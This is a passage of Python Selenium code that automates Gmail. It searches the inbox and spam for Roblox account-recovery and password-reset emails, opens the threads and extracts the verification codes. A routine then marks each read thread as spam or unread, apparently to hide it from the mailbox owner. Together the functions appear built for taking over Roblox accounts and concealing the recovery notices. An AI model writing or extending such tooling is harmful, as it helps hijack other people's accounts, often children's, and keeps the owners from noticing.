    const aria = (cb.getAttribute('aria-label') || '').trim();
    const row = cb.closest('.SU, .Q3, label, fieldset');
    const text = row ? (row.innerText || row.textContent || '') : '';
    if (matchesLabelText(aria) || matchesLabelText(text)) {
      return {cb, via: 'input.SS', text: (aria || text).slice(0, 80)};
    }
  }
  for (const span of document.querySelectorAll('span.ST')) {
    const t = (span.innerText || span.textContent || '').trim();
    if (!matchesLabelText(t)) continue;
    const label = span.closest('label');
    if (!label) continue;
    const cb = label.querySelector('input.SS[type=checkbox], input[type=checkbox]');
    if (cb) return {cb, via: 'span.ST', text: t.slice(0, 80)};
  }
  for (const root of document.querySelectorAll('[role=dialog], [role=menu], [role=complementary], .J-KU-Jg, .bAw, body')) {
    for (const cb of root.querySelectorAll('[role=checkbox], input[type=checkbox]')) {
      let node = cb;
      for (let i = 0; i < 10 && node; i++) {
        const text = (node.innerText || node.textContent || '').trim();
        if (text.length > 0 && text.length < 220 && matchesLabelText(text)) {
          return {cb, via: 'container', text: text.slice(0, 80)};
        }
        node = node.parentElement;
      }
    }
  }
  return null;
}
"""

)

_READ_CONVERSATION_VIEW_JS = (

    _CONVERSATION_VIEW_MATCH_JS

    + r"""
const hit = findConversationCheckbox();
if (!hit) return {found: false, on: null};
const on = isChecked(hit.cb);
return {found: true, on, was_on: on, via: hit.via, text: hit.text || ''};
"""

)

_CLICK_CONVERSATION_VIEW_JS = (

    _CONVERSATION_VIEW_MATCH_JS

    + r"""
const hit = findConversationCheckbox();
if (!hit) return {found: false};
const cb = hit.cb;
const wasOn = isChecked(cb);
if (!wasOn) return {found: true, was_on: false, toggled: false, via: hit.via};
const label = cb.closest('label');
try {
  if (label) label.click(); else cb.click();
} catch (e) {}
if (!isChecked(cb)) {
  return {found: true, was_on: true, toggled: true, via: hit.via};
}
try {
  cb.checked = false;
  cb.dispatchEvent(new Event('input', {bubbles: true}));
  cb.dispatchEvent(new Event('change', {bubbles: true}));
  cb.click();
} catch (e) {}
return {found: true, was_on: true, toggled: !isChecked(cb), via: hit.via};
"""

)

_CLICK_GMAIL_RELOAD_JS = r"""
const reloadRe = /^reload$|^перезагруз|^recarregar|^ricarica|^neu laden|^atualizar/i;
const btn = document.querySelector('[guidedhelpid="_changes_button"]');
if (btn) {
  try { btn.click(); return {clicked: true, via: 'guidedhelpid'}; } catch (e) {}
}
for (const box of document.querySelectorAll('.w-asK')) {
  if (box.offsetParent === null && (box.style.display || '').includes('none')) continue;
  for (const el of box.querySelectorAll('.w-asO, .w-asP, span, a, b, button, [role=button], [role=link]')) {
    const t = ((el.innerText || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
    if (!t || t.length > 80) continue;
    if (reloadRe.test(t)) {
      try { el.click(); return {clicked: true, via: 'w-asK'}; } catch (e) {}
    }
  }
}
for (const root of document.querySelectorAll('[role=alertdialog], [role=dialog], body')) {
  for (const el of root.querySelectorAll('button, a, [role=button], span, b')) {
    const t = ((el.innerText || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
    if (!t || t.length > 80) continue;
    if (reloadRe.test(t)) {
      try { el.click(); return {clicked: true, via: 'dialog'}; } catch (e) {}
    }
  }
}
return {clicked: false};
"""

_DISABLE_CONVERSATION_VIEW_FULL_SETTINGS_JS = (

    r"""
const labelRes = """

    + _CONVERSATION_VIEW_REGEX_JS

    + r""";
const labels = """

    + _CONVERSATION_VIEW_LABELS_JS

    + r""";

function matchesLabelText(text) {
  const t = (text || '').trim();
  if (!t || t.length > 220) return false;
  if (labelRes.some(r => r.test(t))) return true;
  const low = t.toLowerCase();
  return labels.some(l => low.includes(l));
}

for (const row of document.querySelectorAll('tr')) {
  const text = (row.innerText || row.textContent || '').trim();
  if (!matchesLabelText(text)) continue;
  const radios = row.querySelectorAll('input[type=radio]');
  if (!radios.length) continue;
  let target = null;
  for (const r of radios) {
    const label = (r.parentElement && r.parentElement.innerText) || '';
    if (/off|выкл|desativ|désactiv|aus|uit|apagado/i.test(label)) {
      target = r;
      break;
    }
  }
  if (!target) {
    for (const r of radios) {
      if (!r.checked) { target = r; break; }
    }
  }
  if (!target) target = radios[radios.length - 1];
  try { target.click(); } catch (e) {}
  const save = document.querySelector('[guidedhelpid="save_changes_button"]');
  if (save) {
    try { save.click(); return {saved: true, via: 'general'}; } catch (e) {}
  }
  return {saved: false, via: 'general-no-save'};
}
return {saved: false, via: 'general-missing'};
"""

)

def _read_conversation_view_state(driver) -> dict:

    try:

        return driver.execute_script(_READ_CONVERSATION_VIEW_JS) or {}

    except Exception:

        return {}

def _wait_after_gmail_reload(driver, wait: WebDriverWait, timeout: float = 12.0) -> None:

    time.sleep(1.0)

    try:

        wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

    except Exception:

        pass

    wait_gmail_ready(driver, timeout)

def _click_gmail_reload_prompt(driver, *, log: Callable[[str], None], attempts: int = 10) -> bool:

    for i in range(1, attempts + 1):

        result = driver.execute_script(_CLICK_GMAIL_RELOAD_JS) or {}

        if result.get("clicked"):

            log(f"gmail conv-view: reload click #{i} {result}")

            return True

        time.sleep(0.5)

    return False

def _disable_conversation_view_via_general_settings(

    driver,

    wait: WebDriverWait,

    auth: str,

    *,

    log: Callable[[str], None],

) -> bool:

    driver.get(f"https://mail.google.com/mail/u/{auth}/#settings/general")

    _wait_after_gmail_reload(driver, wait, 15.0)

    for i in range(1, 8):

        result = driver.execute_script(_DISABLE_CONVERSATION_VIEW_FULL_SETTINGS_JS) or {}

        log(f"gmail conv-view: general settings #{i} {result}")

        if result.get("saved"):

            _wait_after_gmail_reload(driver, wait, 15.0)

            return True

        time.sleep(0.8)

    return False

def ensure_gmail_conversation_view_off(

    driver,

    wait: WebDriverWait,

    auth: str,

    *,

    log: Callable[[str], None] | None = None,

    force: bool = False,

) -> bool:

    return True

def fetch_roblox_mail_rows(

    driver,

    wait: WebDriverWait,

    auth: str,

    limit: int = ROBLOX_MAIL_LIMIT,

    *,

    include_spam: bool = True,

    include_inbox: bool = True,

    gentle: bool = True,

    expected_min: int = 1,

    log: Callable[[str], None] | None = None,

) -> list[dict]:

    _log = log or (lambda _m: None)

    search_rows = fetch_roblox_search_rows(

        driver, wait, auth, limit, log=_log, gentle=gentle

    )

    rbx = count_roblox_letters(search_rows)

    inbox_rows: list[dict] = []

    spam_rows: list[dict] = []

    need_inbox = include_inbox and (not gentle or rbx < expected_min)

    if need_inbox:

        inbox_rows = fetch_inbox_rows(driver, wait, auth, min(limit, INBOX_LIMIT))

        rbx = count_roblox_letters(search_rows + inbox_rows)

    need_spam = include_spam and (not gentle or rbx < expected_min)

    if need_spam:

        spam_search_rows = fetch_spam_search_rows(

            driver, wait, auth, min(limit, INBOX_LIMIT), log=_log

        )

        spam_folder_rows = fetch_spam_rows(

            driver, wait, auth, min(limit, INBOX_LIMIT)

        )

        spam_rows = dedupe_inbox_rows_by_mail_id(spam_search_rows + spam_folder_rows)

    merged = dedupe_inbox_rows_by_mail_id(search_rows + inbox_rows + spam_rows)

    merged.sort(key=lambda r: (-msg_list_time_ms(r), -gmail_msg_thread_num(r)))

    q = _gmail_search_box_query(driver)

    if q and "from:roblox" not in q.lower() and "roblox.com" not in q.lower():

        _log(f"WARN search box text={q[:60]!r} — unexpected query")

    _log(

        f"mail merge search={len(search_rows)} inbox={len(inbox_rows)} "

        f"spam={len(spam_rows)} roblox={count_roblox_letters(merged)} "

        f"total={len(merged[:limit])} mode=advanced-search"

    )

    return merged[:limit]

def fetch_inbox_rows(

    driver, wait: WebDriverWait, auth: str, limit: int

) -> list[dict]:

    url = f"https://mail.google.com/mail/u/{auth}/#inbox"

    driver.get(url)

    try:

        wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

    except Exception:

        pass

    time.sleep(0.25)

    rows = extract_recent_inbox_messages(driver, limit, "inbox")

    for r in rows:

        r["_box"] = "inbox"

    return rows

def fetch_spam_rows(driver, wait: WebDriverWait, auth: str, limit: int) -> list[dict]:

    url = f"https://mail.google.com/mail/u/{auth}/#spam"

    driver.get(url)

    try:

        wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

    except Exception:

        pass

    time.sleep(0.35)

    rows = extract_recent_inbox_messages(driver, limit, "spam")

    for r in rows:

        r["_box"] = "spam"

    return rows

def pick_newest_recovery(rows: list[dict], since_ms: int = 0, reset_ms: int = 0) -> dict | None:

    best = None

    best_tms = -1

    for msg in rows:

        if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

            continue

        blob = _row_blob(msg)

        if not is_recovery_code_letter(msg.get("subject", ""), blob):

            if not extract_verification_code(blob):

                continue

        tms = msg_list_time_ms(msg)

        floor = max(since_ms, reset_ms - 120000) if reset_ms else since_ms

        if reset_ms and tms <= 0:

            continue

        if floor and tms and tms < floor:

            continue

        if tms >= best_tms:

            best_tms = tms

            best = msg

    return best

def fetch_merged_inbox_spam(

    driver,

    wait: WebDriverWait,

    auth: str,

    limit: int,

    *,

    include_spam: bool = True,

) -> list[dict]:

    inbox_url = f"https://mail.google.com/mail/u/{auth}/#inbox"

    spam_url = f"https://mail.google.com/mail/u/{auth}/#spam"

    cur = (driver.current_url or "").lower()

    on_inbox = f"/mail/u/{auth}/" in cur and "#inbox" in cur

    on_spam = f"/mail/u/{auth}/" in cur and "#spam" in cur

    if not on_inbox:

        driver.get(inbox_url)

        try:

            wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

        except Exception:

            pass

        time.sleep(0.2)

        on_inbox = True

        on_spam = False

    elif on_inbox:

        time.sleep(0.15)

    inbox_rows = extract_recent_inbox_messages(driver, limit, "inbox")

    for r in inbox_rows:

        r["_box"] = "inbox"

    spam_rows: list[dict] = []

    if include_spam:

        if not on_spam:

            driver.get(spam_url)

            try:

                wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))

            except Exception:

                pass

            time.sleep(0.35)

        else:

            time.sleep(0.15)

        spam_rows = extract_recent_inbox_messages(driver, limit, "spam")

        for r in spam_rows:

            r["_box"] = "spam"

        if on_inbox:

            driver.get(inbox_url)

            time.sleep(0.2)

    merged = sorted(

        inbox_rows + spam_rows,

        key=lambda r: -msg_list_time_ms(r),

    )

    return merged[:limit]

def _row_blob(msg: dict) -> str:

    return f"{msg.get('from', '')}\n{msg.get('subject', '')}\n{msg.get('snippet', '')}"

def baseline_seen_subjects(rows: list[dict]) -> set[str]:

    out: set[str] = set()

    for msg in rows:

        if is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

            subj = (msg.get("subject") or "").strip()

            if subj:

                out.add(subj)

    return out

def roblox_baseline_ms(rows: list[dict]) -> int:

    baseline = 0

    for msg in rows:

        if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

            continue

        blob = _row_blob(msg)

        if not is_recovery_code_letter(msg.get("subject", ""), blob):

            continue

        baseline = max(baseline, msg_list_time_ms(msg))

    return baseline

def pick_usable_recovery_letter(

    rows: list[dict],

    *,

    reset_ms: int = 0,

    known_ids: set[str] | None = None,

    min_ms: int = 0,

) -> dict | None:

    candidates: list[tuple[int, int, int, dict]] = []

    for msg in rows:

        if not _row_usable_recovery(

            msg, reset_ms=reset_ms, known_ids=known_ids, min_ms=min_ms

        ):

            continue

        tms = msg_list_time_ms(msg)

        mid = (msg.get("mailId") or "").strip()

        is_new_id = bool(known_ids is not None and mid and mid not in known_ids)

        rank = _recovery_code_rank(msg)

        candidates.append(

            (

                rank,

                0 if is_new_id else 1,

                0 if (msg.get("_box") or "") != "spam" else 1,

                -tms,

                msg,

            )

        )

    if not candidates:

        return None

    candidates.sort(key=lambda x: (x[0], x[1], x[2], x[3]))

    return candidates[0][4]

def pick_roblox_code_letter(

    rows: list[dict], baseline_ms: int, seen_subjects: set[str], min_ms: int = 0

) -> dict | None:

    return pick_roblox_letter_pred(

        rows,

        baseline_ms,

        seen_subjects,

        is_recovery_code_letter,

        min_ms=min_ms,

    )

def pick_roblox_letter_pred(

    rows: list[dict],

    baseline_ms: int,

    seen_subjects: set[str],

    pred,

    min_ms: int = 0,

) -> dict | None:

    candidates = list_roblox_letter_pred(

        rows, baseline_ms, seen_subjects, pred, min_ms=min_ms

    )

    return candidates[0] if candidates else None

def list_roblox_letter_pred(

    rows: list[dict],

    baseline_ms: int,

    seen_subjects: set[str],

    pred,

    min_ms: int = 0,

) -> list[dict]:

    candidates: list[tuple[int, int, dict]] = []

    for msg in rows:

        if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

            continue

        blob = _row_blob(msg)

        if not pred(msg.get("subject", ""), blob):

            continue

        tms = msg_list_time_ms(msg)

        if min_ms and tms < min_ms:

            continue

        subj = (msg.get("subject") or "").strip()

        is_new = tms > baseline_ms or (subj and subj not in seen_subjects)

        if not is_new:

            continue

        candidates.append((0 if (msg.get("_box") or "") != "spam" else 1, -tms, msg))

    candidates.sort(key=lambda x: (x[0], x[1]))

    return [msg for _, _, msg in candidates]

_SPAM_TOOLBAR_SELECTORS = (

    'div[data-tooltip="Report spam"]',

    'div[aria-label="Report spam"]',

    'div[data-tooltip="Спам"]',

    'div[aria-label="Спам"]',

    "div.T-I.J-J5-Ji.bvt.T-I-ax7.T-I-Js-Gs",

)

def mark_thread_spam(

    driver,

    *,

    log=None,

    dump_dir: Path | None = None,

) -> bool:

    _log = log or (lambda _m: None)

    time.sleep(0.25)

    for sel in _SPAM_TOOLBAR_SELECTORS:

        try:

            btn = driver.find_element(By.CSS_SELECTOR, sel)

            if btn.is_displayed():

                driver.execute_script("arguments[0].click();", btn)

                time.sleep(0.45)

                _log("mark spam: ok")

                return True

        except Exception:

            continue

    try:

        clicked = driver.execute_script(

            r"""
            for (const el of document.querySelectorAll('div[role="button"], span[role="button"]')) {
                const tip = (el.getAttribute('data-tooltip') || el.getAttribute('aria-label') || '').toLowerCase();
                if (tip.includes('report spam') || tip.includes('спам') || tip.includes('пометить как спам')) {
                    el.click();
                    return true;
                }
            }
            return false;
            """

        )

        if clicked:

            time.sleep(0.45)

            _log("mark spam: ok (js)")

            return True

    except Exception:

        pass

    _log("mark spam: fail")

    if dump_dir:

        dump_page_debug(driver, dump_dir, "mark_spam_fail")

    return False

def hide_thread_after_read(

    driver,

    wait: WebDriverWait | None,

    *,

    log=None,

    dump_dir: Path | None = None,

    use_spam: bool = True,

    use_unread: bool = False,

) -> None:

    _log = log or (lambda _m: None)

    if use_spam and mark_thread_spam(driver, log=_log, dump_dir=dump_dir):

        return

    if use_unread:

        mark_thread_unread(driver, wait, log=_log, dump_dir=dump_dir)

_UNREAD_TOOLBAR_SELECTORS = (

    "div.T-I.J-J5-Ji.bvt.T-I-ax7.T-I-Js-IF.mA",

    'div[data-tooltip="Mark as unread"]',

    'div[aria-label="Mark as unread"]',

    'div[data-tooltip="Пометить как непрочитанное"]',

    'div[aria-label="Пометить как непрочитанное"]',

)

def _recovery_code_rank(msg: dict) -> int:

    subj = (msg.get("subject") or "").lower()

    blob = _row_blob(msg).lower()

    if "account recovery" in subj or "recovery request" in subj:

        return 0

    if extract_verification_code(_row_blob(msg)):

        if "security code" in blob or "recovery" in blob:

            return 1

    if "password reset" in subj:

        return 3

    return 2

def _pick_fresh_recovery_rows(

    rows: list[dict],

    *,

    reset_ms: int = 0,

    min_ms: int = 0,

    known_ids: set[str] | None = None,

) -> list[dict]:

    out: list[tuple[int, int, dict]] = []

    for msg in rows:

        if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

            continue

        subj = (msg.get("subject") or "").strip()

        blob = _row_blob(msg)

        if not is_recovery_code_letter(subj, blob):

            continue

        tms = msg_list_time_ms(msg)

        mid = (msg.get("mailId") or "").strip()

        is_new_id = bool(known_ids is not None and mid and mid not in known_ids)

        if reset_ms:

            if min_ms and tms and tms < min_ms:

                continue

            if is_new_id:

                out.append((0, 0 if tms else 1, msg))

                continue

            if not tms:

                continue

            if tms < reset_ms - 120_000:

                continue

        out.append((1, -tms, msg))

    out.sort(key=lambda x: (x[0], x[1]))

    return [msg for _, _, msg in out]

def _row_usable_recovery(

    msg: dict,

    *,

    reset_ms: int = 0,

    known_ids: set[str] | None = None,

    min_ms: int = 0,

) -> bool:

    if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

        return False

    blob = _row_blob(msg)

    if not is_recovery_code_letter(msg.get("subject", ""), blob):

        return False

    tms = msg_list_time_ms(msg)

    if min_ms and tms and tms < min_ms:

        return False

    if not reset_ms:

        return True

    mid = (msg.get("mailId") or "").strip()

    subj_l = (msg.get("subject") or "").lower()

    is_new_id = bool(known_ids is not None and mid and mid not in known_ids)

    if known_ids is not None and mid and mid in known_ids:

        if not tms or tms < reset_ms - 8_000:

            return False

    if is_new_id:

        if tms and tms < reset_ms - 120_000:

            return False

        return True

    if tms and tms < reset_ms - 120_000:

        return False

    if not tms:

        return False

    subj = (msg.get("subject") or "").lower()

    blob = _row_blob(msg)

    if "password reset" in subj and "account recovery" not in subj:

        if not extract_verification_code(blob):

            return False

        if "security code" not in blob.lower() and "recovery" not in blob.lower():

            return False

    return True

def _row_is_fresh_recovery(

    msg: dict,

    baseline_ms: int,

    seen_subjects: set[str],

    *,

    min_ms: int = 0,

    reset_ms: int = 0,

    known_ids: set[str] | None = None,

) -> bool:

    if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

        return False

    blob = _row_blob(msg)

    if not is_recovery_code_letter(msg.get("subject", ""), blob):

        return False

    tms = msg_list_time_ms(msg)

    subj = (msg.get("subject") or "").strip()

    if min_ms and tms and tms < min_ms:

        return False

    mid = (msg.get("mailId") or "").strip()

    if known_ids is not None and reset_ms:

        if mid and mid in known_ids:

            return bool(tms and tms >= reset_ms - 8000)

        if mid and mid not in known_ids:

            return True

        return bool(tms and tms >= reset_ms - 8000)

    return tms > baseline_ms or (subj and subj not in seen_subjects)

def mark_thread_unread(

    driver,

    wait: WebDriverWait | None = None,

    *,

    log=None,

    dump_dir: Path | None = None,

) -> bool:

    _log = log or (lambda _m: None)

    try:

        WebDriverWait(driver, 5).until(

            EC.presence_of_element_located(

                (By.CSS_SELECTOR, "div.a3s, div[role='toolbar'], div[gh='mtb']")

            )

        )

    except Exception:

        pass

    time.sleep(0.35)

    for sel in _UNREAD_TOOLBAR_SELECTORS:

        try:

            btn = driver.find_element(By.CSS_SELECTOR, sel)

            if btn.is_displayed():

                driver.execute_script("arguments[0].click();", btn)

                time.sleep(0.3)

                _log("mark unread: ok")

                return True

        except Exception:

            continue

    try:

        clicked = driver.execute_script(

            r"""
            for (const el of document.querySelectorAll('div[role="button"], span[role="button"]')) {
                const tip = (el.getAttribute('data-tooltip') || el.getAttribute('aria-label') || '').toLowerCase();
                if (tip.includes('mark as unread') || tip.includes('непрочитан')) {
                    el.click();
                    return true;
                }
            }
            return false;
            """

        )

        if clicked:

            time.sleep(0.3)

            _log("mark unread: ok (js)")

            return True

    except Exception:

        pass

    _log("mark unread: fail")

    if dump_dir:

        dump_page_debug(driver, dump_dir, "mark_unread_fail")

    return False

def close_thread_to_inbox(driver, auth: str) -> None:

    try:

        driver.find_element(By.TAG_NAME, "body").send_keys(Keys.ESCAPE)

        time.sleep(0.2)

    except Exception:

        pass

    try:

        driver.execute_script("window.location.hash = '#inbox';")

        time.sleep(0.35)

    except Exception:

        driver.get(f"https://mail.google.com/mail/u/{auth}/#inbox")

        time.sleep(0.3)

def try_code_from_row_snippet(row: dict) -> str | None:

    return extract_verification_code(_row_blob(row))

def _code_from_stacked_thread(

    subject: str,

    body: str,

    html: str,

    pred,

    *,

    skip_codes: set[str] | None = None,

    newest_only: bool = True,

) -> str | None:

    code, _ = extract_2fa_code_from_thread(

        subject,

        body,

        html,

        pred,

        skip_codes=skip_codes or set(),

        newest_only=newest_only,

    )

    return code

def _pick_fresh_thread_code(

    subject: str,

    body: str,

    html: str,

    pred,

    *,

    skip_codes: set[str],

    twofa_snap: dict | None = None,

    send_after_ms: int = 0,

) -> str | None:

    twofa = twofa_snap or {}

    skip = _twofa_poll_skip(twofa_snap, skip_codes)

    if pred is is_recovery_code_letter:

        from retriever_shared.mail_parse import _thread_parts

        parts = list(reversed(_thread_parts(body, html)))

        if not parts:

            parts = [body or html or ""]

        for part in parts:

            if not pred(subject, part):

                continue

            for code in extract_all_verification_codes(part):

                if code and code not in skip and code != "000000":

                    return code

        return None

    min_parts = 1

    code, _ = extract_2fa_code_from_thread(

        subject,

        body,

        html,

        pred,

        skip_codes=skip,

        newest_only=True,

        min_parts=min_parts,

    )

    return code

def try_codes_from_stacked_threads(

    driver,

    wait: WebDriverWait,

    auth: str,

    rows: list[dict],

    pred,

    *,

    min_ms: int = 0,

    baseline_ms: int = 0,

    seen_subjects: set[str] | None = None,

    log=None,

    dump_dir: Path | None = None,

    skip_codes: set[str] | None = None,

    max_threads: int = 3,

    twofa_snap: dict | None = None,

    send_after_ms: int = 0,

) -> tuple[str | None, str, str]:

    _log = log or (lambda _m: None)

    seen = seen_subjects or set()

    skip = _twofa_poll_skip(twofa_snap, skip_codes)

    candidates: list[tuple[int, dict]] = []

    for msg in rows:

        if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

            continue

        stack_n = row_stack_count(msg)

        if stack_n < 1:

            continue

        tms = msg_list_time_ms(msg)

        if min_ms and tms and tms < min_ms:

            continue

        blob = _row_blob(msg)

        if pred and not pred(msg.get("subject", ""), blob):

            continue

        is_new = tms > baseline_ms or (

            (msg.get("subject") or "").strip() not in seen

        )

        if baseline_ms and not is_new and min_ms and tms < min_ms:

            continue

        if send_after_ms and tms and list_tms_stale(tms, send_after_ms):

            continue

        box_prio = 0 if (msg.get("_box") or "") == "spam" else 1

        candidates.append((box_prio, -tms, msg))

    candidates.sort(key=lambda x: (x[0], x[1]))

    for _, _, msg in candidates[:max_threads]:

        subj = (msg.get("subject") or "").strip()

        blob = _row_blob(msg)

        if is_2fa_status_notification_letter(subj, blob):

            _log(f"stack skip notification: {subj[:50]}")

            continue

        _log(f"stack open: {subj[:50]} x{row_stack_count(msg)}")

        body, html = open_thread(

            driver, wait, msg, auth, log=_log, dump_dir=dump_dir, expand=True

        )

        code = _pick_fresh_thread_code(

            subj,

            body,

            html,

            pred,

            skip_codes=skip,

            twofa_snap=twofa_snap,

            send_after_ms=send_after_ms,

        )

        if code:

            return code, body, html

    return None, "", ""

def try_open_recovery_threads(

    driver,

    wait: WebDriverWait,

    auth: str,

    rows: list[dict],

    pred,

    *,

    known_ids: set[str] | None = None,

    reset_ms: int = 0,

    min_ms: int = 0,

    skip_codes: set[str] | None = None,

    log=None,

    dump_dir: Path | None = None,

    max_threads: int = 6,

) -> tuple[str | None, str, str]:

    _log = log or (lambda _m: None)

    skip = set(skip_codes or ())

    candidates: list[tuple[tuple, dict]] = []

    for idx, msg in enumerate(rows):

        if not is_roblox_letter(msg.get("from", ""), msg.get("subject", "")):

            continue

        subj = (msg.get("subject") or "").strip()

        blob = _row_blob(msg)

        if not pred(subj, blob):

            continue

        mid = (msg.get("mailId") or "").strip()

        tms = msg_list_time_ms(msg)

        is_new_id = bool(known_ids is not None and mid and mid not in known_ids)

        subj_l = subj.lower()

        is_acct_recovery = "account recovery" in subj_l

        stack_n = row_stack_count(msg)

        prio = (

            0 if is_new_id else 1,

            0 if is_acct_recovery else 1,

            -stack_n,

            -tms,

            idx,

        )

        candidates.append((prio, msg))

    candidates.sort(key=lambda x: x[0])

    for prio, msg in candidates[:max_threads]:

        subj = (msg.get("subject") or "").strip()

        blob = _row_blob(msg)

        if is_2fa_status_notification_letter(subj, blob):

            _log(f"recovery skip notification: {subj[:45]}")

            continue

        mid = (msg.get("mailId") or "")[:24]

        stack_n = row_stack_count(msg)

        _log(

            f"recovery open: {subj[:45]} id={mid} stack={stack_n} prio={prio}"

        )

        body, html = open_thread(

            driver, wait, msg, auth, log=_log, dump_dir=dump_dir, expand=True

        )

        code = _pick_fresh_thread_code(

            subj,

            body,

            html,

            pred,

            skip_codes=skip,

            send_after_ms=reset_ms or min_ms,

        )

        if code and code not in skip:

            _log(f"recovery code {code} from thread {subj[:40]}")

            return code, body, html

        _log(f"recovery open no code: {subj[:40]} body_len={len(body)}")

    return None, "", ""

_EXPAND_THREAD_JS = r"""
for (let round = 0; round < 6; round++) {
    let clicked = false;
    for (const el of document.querySelectorAll('span[role="link"], div[role="button"], a, button')) {
        const t = ((el.innerText || '') + ' ' + (el.getAttribute('aria-label') || '')).trim();
        if (/show \d+ (older|more|newer|previous)|\d+ (older|newer|more) messages|ещё \d+|ещё|show trimmed|развернуть|expand all|view entire|показать/i.test(t)) {
            try { el.click(); clicked = true; } catch (e) {}
        }
    }
    if (!clicked) break;
}
"""

_EXTRACT_THREAD_BODIES_JS = r"""
const bodies = [...document.querySelectorAll('div.a3s')].map(el => el.innerText || '').filter(t => t.length > 8);
const htmls = [...document.querySelectorAll('div.a3s')].map(el => el.innerHTML || '').filter(t => t.length > 8);
if (!bodies.length) {
    const main = document.querySelector('div[role="main"]');
    const t = main ? (main.innerText || '').slice(0, 20000) : '';
    return { body: t, html: '' };
}
return { body: bodies.join('\n\n---\n\n'), html: htmls.join('\n\n---\n\n') };
"""

def open_thread(

    driver,

    wait: WebDriverWait,

    row: dict,

    auth: str,

    *,

    log=None,

    dump_dir: Path | None = None,

    expand: bool = True,

) -> tuple[str, str]:

    _log = log or (lambda _m: None)

    mail_id = normalize_thread_mail_id(row)

    subject = (row.get("subject") or "").strip()

    box = row.get("_box") or "inbox"

    href = (row.get("threadHref") or "").strip()

    _log(f"open_thread: {subject[:60] or mail_id[:32]} id={mail_id[:40]}")

    if not mail_id and not href and not subject:

        _log("open_thread: skip no mailId")

        return "", ""

    attempts: list[tuple[str, str]] = []

    if box == "spam":

        if subject:

            attempts.append(("spam_search", subject))

        if href and "mail.google" in href:

            attempts.append(

                (

                    "href",

                    href if href.startswith("http") else f"https://mail.google.com{href}",

                )

            )

    else:

        if href and "mail.google" in href:

            attempts.append(("href", href if href.startswith("http") else f"https://mail.google.com{href}"))

        if mail_id.startswith("FM"):

            attempts.append(("url", f"https://mail.google.com/mail/u/{auth}/{thread_hash_frag(mail_id, box)}"))

        attempts.append(("click", ""))

        if subject:

            attempts.append(("search", subject))

        if mail_id.startswith("thread-f:"):

            attempts.append(("url", f"https://mail.google.com/mail/u/{auth}/#all/{mail_id}"))

            attempts.append(("url", f"https://mail.google.com/mail/u/{auth}/{thread_hash_frag(mail_id, box)}"))

    opened = False

    for mode, arg in attempts:

        if mode == "click":

            if not _click_thread_row(driver, mail_id, subject):

                continue

            _log("open_thread: opened via row click")

        elif mode == "search":

            if not _open_via_gmail_search(driver, auth, arg):

                continue

            _log("open_thread: opened via search+click")

        elif mode == "spam_search":

            q = urllib.parse.quote(

                f'{ROBLOX_SPAM_SEARCH_LINK} "{arg[:55]}"', safe=""

            )

            driver.get(f"https://mail.google.com/mail/u/{auth}/#search/{q}")

            time.sleep(1.4)

            if not _click_thread_row(driver, "", arg):

                continue

            _log("open_thread: opened via spam-search+click")

        elif mode == "href":

            driver.get(arg)

            _log("open_thread: opened via threadHref")

        elif mode == "url":

            driver.get(arg)

            _log(f"open_thread: opened via url {arg.split('#')[-1][:40]}")

        try:

            WebDriverWait(driver, 8).until(

                EC.presence_of_element_located((By.CSS_SELECTOR, "div.a3s, div[role='main']"))

            )

        except Exception:

            pass

        time.sleep(0.55)

        if _thread_view_open(driver, subject):

            opened = True

            break

        _log(f"open_thread: {mode} did not load thread view")

    if not opened:

        _log("open_thread: all strategies failed")

        return "", ""

    if expand:

        try:

            driver.execute_script(_EXPAND_THREAD_JS)

            time.sleep(0.35)

        except Exception:

            pass

    extracted = driver.execute_script(_EXTRACT_THREAD_BODIES_JS) or {}

    body = str(extracted.get("body") or "")

    html = str(extracted.get("html") or "")

    if not body:

        body = driver.execute_script(

            r"""
        const els = document.querySelectorAll('div.a3s');
        const el = els.length ? els[els.length - 1] : document.querySelector('div.a3s');
        if (el) return el.innerText || '';
        const main = document.querySelector('div[role="main"]');
        return main ? (main.innerText || '').slice(0, 16000) : '';
        """

        ) or ""

    if not html:

        html = driver.execute_script(

            r"""
        const els = document.querySelectorAll('div.a3s');
        const el = els.length ? els[els.length - 1] : document.querySelector('div.a3s');
        return el ? el.innerHTML || '' : '';
        """

        ) or ""

    if dump_dir:

        safe_tag = re.sub(r"[^\w\-]+", "_", (subject or mail_id)[:35]) or "thread"

        dump_thread_page(driver, dump_dir, f"open_{safe_tag}")

        try:

            full = f"{subject}\n\n{body}\n\n{html}"

            dump_dir.mkdir(parents=True, exist_ok=True)

            (dump_dir / f"open_{safe_tag}_{int(time.time())}.full.txt").write_text(

                full, encoding="utf-8"

            )

        except Exception:

            pass

    close_thread_to_inbox(driver, auth)

    return str(body or ""), str(html or "")

def back_to_inbox(driver, auth: str) -> None:

    close_thread_to_inbox(driver, auth)

def extract_email_from_open_thread(driver) -> str | None:

    return driver.execute_script(

        r"""
        const re = /[\w.+-]+@gmail\.com/i;
        for (const sel of ['[email]', '[data-hovercard-id]', '[data-email]']) {
            for (const el of document.querySelectorAll(sel)) {
                const s = el.getAttribute('email') || el.getAttribute('data-hovercard-id') || el.getAttribute('data-email') || '';
                const m = s.match(re);
                if (m) return m[0].toLowerCase();
            }
        }
        const hdr = document.querySelector('div.ha');
        if (hdr) {
            const m = (hdr.innerText || '').match(re);
            if (m) return m[0].toLowerCase();
        }
        const a3s = document.querySelector('div.a3s');
        if (a3s) {
            const m = (a3s.innerText || '').match(re);
            if (m) return m[0].toLowerCase();
        }
        const body = document.body ? document.body.innerText : '';
        const all = body.match(/[\w.+-]+@gmail\.com/gi);
        if (all && all.length) return all[0].toLowerCase();
        return null;
        """

    )

def extract_gmail_from_page(driver, *, fallback: str | None = None) -> str | None:

    title_email = extract_gmail_from_title(driver.title or "")

    if title_email:

